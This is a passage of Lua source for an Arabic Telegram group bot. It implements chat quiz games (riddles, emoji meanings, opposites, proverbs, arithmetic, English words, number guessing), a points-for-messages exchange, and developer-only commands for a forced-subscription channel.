مرة وصلك غزل من فتاة؟🌚","شخص أو صاحب عوضك ونساك مُر الحياة ما اسمه ؟","| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه مقدمة الحديث شو راح تكون ؟.", }  
faeder2 = math.random(#faeder)
faederdx(msg.chat_id_, msg.id_, 1, faeder[faeder2] , 1, 'md')  
end
--     By Developer Faeder     -- 
if text == 'محيبس' or text == 'بات' or text == 'المحيبس' and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ الالعاب معطله من قبل الادمن \n↫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "faeder"
end
Num = math.random(1,6)
faederdx1:set(FAEDER.."GAMES"..msg.chat_id_,Num) 
TEST = [[
*➀       ➁     ➂      ➃      ➄     ➅
↓      ↓     ↓      ↓     ↓     ↓
👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊


↫ اختر رقم يد لاستخراج المحيبس ،
↫ الفائز يحصل على { 5 } النقاط .*
]]
faederdx( msg.chat_id_, msg.id_, 1, TEST, 1, "md")
faederdx1:setex(FAEDER.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
if text == 'حزوره' and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ الالعاب معطله من قبل الادمن \n↫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "faeder"
end
faederdx1:del(FAEDER..'bot:l:id'..msg.chat_id_)
faeder2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = faeder2[math.random(#faeder2)]
faederdx1:set(FAEDER..'bot:bkbk'..msg.chat_id_,name)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟') name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟') name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ') name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟') name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟') name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ') name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ') name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟') name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ') name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟') name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ') name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟') name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ') name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ') name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟') name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟') name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟') name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
faeder = '↫ اول واحد يحلها  {'..name..'} يربح '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
end
if text == ''..(faederdx1:get(FAEDER..'bot:bkbk'..msg.chat_id_) or 'لفاتع')..'' and not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then
if not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then 
faeder = '↫ مبروك لقد ربحت \n↫ للعب مره اخرى ارسل حزوره . '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
faederdx1:incrby(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
faederdx1:set(FAEDER..'bot:l:id'..msg.chat_id_,true)
end
if text == 'المعاني' and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ الالعاب معطله من قبل الادمن \n↫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "faeder"
end
faederdx1:del(FAEDER..'bot:l:id'..msg.chat_id_)
faeder2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = faeder2[math.random(#faeder2)]
faederdx1:set(FAEDER..'bot:bkbk2'..msg.chat_id_,name)
name = string.gsub(name,'قرد','🐒') name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧') name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉') name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓') name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄') name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊') name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅') name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟') name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁') name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺') name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂') name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔') name = string.gsub(name,'تفاحه','🍎') name = string.gsub(name,'باذنجان','🍆')
faeder = '↫ ما معنى هذا السمايل ؟  {'..name..'} '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
end
if text == ''..(faederdx1:get(FAEDER..'bot:bkbk2'..msg.chat_id_) or 'لفاتع')..'' and not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then
if not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then 
faeder = '↫ مبروك لقد ربحت \n↫ للعب مره اخرى ارسل المعاني . '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
faederdx1:incrby(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
faederdx1:set(FAEDER..'bot:l:id'..msg.chat_id_,true)
end
if text == 'العكس' and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ الالعاب معطله من قبل الادمن \n↫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "faeder"
end
faederdx1:del(FAEDER..'bot:l:id'..msg.chat_id_)
faeder2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = faeder2[math.random(#faeder2)]
faederdx1:set(FAEDER..'bot:bkbk3'..msg.chat_id_,name)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'موحلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'عدل','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','حمار')
name = string.gsub(name,'هادئ','عصبي')
faeder = '↫ عكس كلمه ~ {'..name..'} '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
end
if text == ''..(faederdx1:get(FAEDER..'bot:bkbk3'..msg.chat_id_) or 'لفاتع')..'' and not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then
if not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then 
faeder = '↫ مبروك لقد ربحت \n↫ للعب مره اخرى ارسل العكس . '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
faederdx1:incrby(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
faederdx1:set(FAEDER..'bot:l:id'..msg.chat_id_,true)
end
if text == 'المختلف' and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ الالعاب معطله من قبل الادمن \n↫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "faeder"
end
faederdx1:del(FAEDER..'bot:l:id'..msg.chat_id_)
faeder2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧜‍♂','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕒','🕤','⌛️','📅',
};
name = faeder2[math.random(#faeder2)]
faederdx1:set(FAEDER..'bot:bkbk4'..msg.chat_id_,name)
name = string.gsub(name,'😸','😹😹😹😹😹😹😹😹😸😹😹😹😹') name = string.gsub(name,'☠','💀💀💀💀💀💀💀☠💀💀💀💀💀')
name = string.gsub(name,',','👻👻👻👻👻👻👻🐼👻👻👻👻👻') name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚🌚') name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑🌑')
name = string.gsub(name,'⭐️','⭐️') name = string.gsub(name,'📥','💫💫💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨🌨🌨⛈🌨🌨🌨🌨') name = string.gsub(name,'🌥','⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃☃☃☃☃☃⛄️☃☃☃☃') name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👩‍‍💻👩‍‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻') name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳') name = string.gsub(name,'🧚‍♀','🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂')
name = string.gsub(name,'🧜‍♂','🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♂🧜‍♀🧜‍♀🧜‍♀') name = string.gsub(name,'🧝‍♂','🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♂🧝‍♀🧝‍♀🧝‍♀') 
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️') name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👭👬👭👭👭') name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕒','🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒') name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⏳⌛️⏳⏳') name = string.gsub(name,'📅','📆📆📆📆📆📆📅📆📆')
faeder = '↫ اول واحد يطلع المختلف {'..name..'} يربح '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
end
if text == ''..(faederdx1:get(FAEDER..'bot:bkbk4'..msg.chat_id_) or 'لفاتع')..'' and not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then
if not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then 
faeder = '↫ مبروك لقد ربحت \n↫ للعب مره اخرى ارسل المختلف . '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
faederdx1:incrby(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
faederdx1:set(FAEDER..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'امثله' and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ الالعاب معطله من قبل الادمن \n↫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "faeder"
end
faederdx1:del(FAEDER..'bot:l:id'..msg.chat_id_)
faeder2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = faeder2[math.random(#faeder2)]
faederdx1:set(FAEDER..'bot:bkbk5'..msg.chat_id_,name)
name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
name = string.gsub(name,'ضراطه','الي يسوق الحمار يتحمل ___ ')
name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من ___ نعال')
name = string.gsub(name,'شقره','مع الخيل يا ___ ')
name = string.gsub(name,'النخله','الطول طول ___ والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر ___ ')
name = string.gsub(name,'الخيل','من قلة ___ شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني ___ ')
name = string.gsub(name,'المبلل',' ___ ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة ___ ')
name = string.gsub(name,'يركص','المايعرف ___ يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح ___ يكول حامض')
name = string.gsub(name,'العمه','___ إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي ___ للخباز حتى لو ياكل نصه')
name = string.gsub(name,'بالحصاد','اسمة ___ ومنجله مكسور')
name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من على الحاضر لكة')
name = string.gsub(name,'القرد',' ___ بعين امه غزال')
name = string.gsub(name,'يكحله','اجه ___ عماها')
faeder = '↫ اكمل المثل التالي \n {'..name..'}'
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
end 
if text == ''..(faederdx1:get(FAEDER..'bot:bkbk5'..msg.chat_id_) or 'لفاتع')..'' and not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then
if not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then 
faeder = '↫ مبروك لقد ربحت \n↫ للعب مره اخرى ارسل ام��له . '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
faederdx1:incrby(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
faederdx1:set(FAEDER..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'رياضيات' and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ الالعاب معطله من قبل الادمن \n↫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "faeder"
end
faederdx1:del(FAEDER..'bot:l:id'..msg.chat_id_)
faeder2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = faeder2[math.random(#faeder2)]
faederdx1:set(FAEDER..'bot:bkbk6'..msg.chat_id_,name)
name = string.gsub(name,'9','7 + 2 = ?') name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?') name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?') name = string.gsub(name,'4','40 ÷ 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?') name = string.gsub(name,'10','100 ÷ 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?') name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?') name = string.gsub(name,'5','12 + 1 - 8 = ?') name = string.gsub(name,'16','16 + 16 - 16 = ?')
faeder = '↫ اكمل المعادله \n - {'..name..'} .'
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
end 
if text == ''..(faederdx1:get(FAEDER..'bot:bkbk6'..msg.chat_id_) or 'لفاتع')..'' and not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then
if not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then 
faeder = '↫ مبروك لقد ربحت \n↫ للعب مره اخرى ارسل رياضيات . '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
faederdx1:incrby(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
faederdx1:set(FAEDER..'bot:l:id'..msg.chat_id_,true)
end
if text == 'انقليزي' and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ الالعاب معطله من قبل الادمن \n↫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "faeder"
end
faederdx1:del(FAEDER..'bot:l:id'..msg.chat_id_)
faeder2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
name = faeder2[math.random(#faeder2)]
faederdx1:set(FAEDER..'bot:bkbk7'..msg.chat_id_,name)
name = string.gsub(name,'ذئب','Wolf') name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','Channels') name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book') name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'نقود','money') name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile') name = string.gsub(name,'شاطئ','Beach')
name = string.gsub(name,'غبي','Stupid') name = string.gsub(name,'صداقه','Friendchip')
name = string.gsub(name,'ذكي','Smart') 
faeder = '↫ ما معنى كلمه {'..name..'} '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
end
if text == ''..(faederdx1:get(FAEDER..'bot:bkbk7'..msg.chat_id_) or 'لفاتع')..'' and not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then
if not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then 
faeder = '↫ مبروك لقد ربحت \n↫ للعب مره اخرى ارسل انقليزي . '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
faederdx1:incrby(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
faederdx1:set(FAEDER..'bot:l:id'..msg.chat_id_,true)
end
--     By Developer Faeder     -- 
if faederdx1:get(FAEDER.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
faederdx(msg.chat_id_, msg.id_, 1,"↫ عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = faederdx1:get(FAEDER.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
faederdx1:del(FAEDER..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
faederdx1:del(FAEDER.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
faederdx1:incrby(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
faederdx(msg.chat_id_, msg.id_, 1,'*↫ التخمين الصحيح هو* ~ '..NUM..'\n*↫ مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
faederdx1:incrby(FAEDER..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(faederdx1:get(FAEDER..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
faederdx1:del(FAEDER..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
faederdx1:del(FAEDER.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
faederdx(msg.chat_id_, msg.id_, 1,'*↫ التخمين الصحيح هو*  '..GETNUM..'\n*↫ للاسف لقد خسرت حاول مره اخرى\n↫ للعب مره اخره ارسل ( تخمين )*', 1, 'md')
else
if tonumber(faederdx1:get(FAEDER..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(faederdx1:get(FAEDER..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'محاوله واحده فقط'
end
faederdx(msg.chat_id_, msg.id_, 1,'↫ لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
end
end
end
end
if text == 'خمن' and faeder11(msg) or text == 'تخمين' and faeder11(msg) then   
if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ الالعاب معطله من قبل الادمن \n↫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "faeder"
end
Num = math.random(1,20)
faederdx1:set(FAEDER.."GAMES:NUM"..msg.chat_id_,Num) 
faederdx(msg.chat_id_, msg.id_, 1,'↫ اهلا بك عزيزي في لعبة التخمين  \n         ───────────────\n↫ سيتم تخمين عدد ما بين الـ1 والـ20 .\n↫ ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !\n↫ بدأت اللعبه ارسل لي تخمينك الان', 1, 'md')
faederdx1:setex(FAEDER.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
--     By Developer Faeder     -- 
if text == 'الالعاب' or text == 'اللعبه' and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ الالعاب معطله \n↫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1,[[*
↫ اهلا بك في قائمه الالعاب ↓↓
         ───────────────
↫ الالعاب المتوفره بالبوت ↓↓
         ───────────────
↫ ارسل امر { تخمين } لبدء لعبه
↫ ارسل امر { كت تويت } لبدء لعبه
↫ ارسل امر { ترتيب } لبدء لعبه 
↫ ارسل امر { سمايلات } لبدء لعبه 
↫ ارسل امر { حزوره } لبدء لعبه 
↫ ارسل امر { المعاني } لبدء لعبه 
↫ ارسل امر { العكس } لبدء لعبه 
↫ ارسل امر { المحيبس } لبدء لعبه 
↫ ارسل امر { امثله } لبدء لعبه 
↫ ارسل امر { المختلف } لبدء لعبه 
↫ ارسل امر { انقليزي } لبدء لعبه 
↫ ارسل امر { رياضيات } لبدء لعبه 
         ───────────────
↫ قناة السورس *[@badboy_here] 
]], 1, 'md')
end end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) and idf:match("-100(%d+)") and text:match("^ضع عدد النقاط (%d+)$")  then
local dx1 = { string.match(text, "^(ضع عدد النقاط) (%d+)$")}
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم وضع عدد نقاط البيع\n↫ يمكن للعضو بيع نقاط اللعبه\n↫ اذا كان عدد نقاطه اكبر من~ *"..dx1[2].."*\n",1, 'md')
faederdx1:set(FAEDER.."FAEDER_OO0" .. msg.chat_id_, dx1[2])
return false end
--     By Developer Faeder     -- 
if text == 'بيع نقاطي' and faeder11(msg) then
if tonumber((faederdx1:get(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
faeder0 = '↫ ليس لديك نقاط العب اولا \n↫ للعب ارسل { الالعاب } لرؤيه الالعاب المتاحه '
faederdx(msg.chat_id_, msg.id_, 1,faeder0, 1, 'md') 
else
faeder0 = (faederdx1:get(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) * tonumber(faederdx1:get('faeder:'..bot_id..'gamepoint' .. msg.chat_id_)or 50))
faederdx1:incrby('faeder:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_,faeder0)  
faederdx1:del(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_)
faeder0 = tonumber((faederdx1:get('faeder:'..bot_id..'gamepoint' .. msg.chat_id_) or 50))
faederdx(msg.chat_id_, msg.id_, 1,'↫ تم بيع نقاطك \n↫ كل نقطه تساوي  '..faeder0..' رساله ', 'md')
end end
--     By Developer Faeder     -- 
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" and faeder11(msg) then
if not is_leader(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫  للمطور الاساسي فقط ', 1, 'md')
else
faederdx1:setex(FAEDER..'faeder4'..msg.sender_user_id_,300,true)
faederdx(msg.chat_id_,msg.id_, 1, "*↫ ارسل لي معرف قناة الاشتراك *\n", 1 , "md")
end end
--     By Developer Faeder     -- 
if text == 'تفعيل الاشتراك الاجباري' then
if not is_leader(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫  للمطور الاساسي فقط ', 1, 'md')
else
if not faederdx1:get(FAEDER..'faeder3') then
faederdx(msg.chat_id_,msg.id_, 1, "*↫ لم يتم تعيين القناة \n↫ ارسل تعيين قناة الاشتراك . *", 1 , "md")
return false 
end
if faederdx1:get(FAEDER..'faeder3') then
faederdx(msg.chat_id_,msg.id_, 1, "*↫ تم تفعيل الاشتراك الاجباري \n↫ تاكد من رفعي ادمن في قناتك .*", 1 , "md")
faederdx1:set(FAEDER.."faeder2", true)
return false end end end
--     By Developer Faeder     -- 
if text == 'تعطيل الاشتراك الاجباري' then
if not is_leader(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫  للمطور الاساسي فقط ', 1, 'md')
else
faederdx(msg.chat_id_,msg.id_, 1, "*↫ تم تعطيل الاشتراك الاجباري *\n", 1 , "md")
faederdx1:del(FAEDER.."faeder2")
return false 
end end
--     By Developer Faeder     -- 
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' then
if not is_leader(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫  للمطور الاساسي فقط ', 1, 'md')
else
local faeder5 = faederdx1:get(FAEDER.."faeder3")
if faeder5 then
faederdx(msg.chat_id_, msg.id_, 1, '↫ *قناة الاشتراك* : ['..faeder5..']', 1, 'md')
else
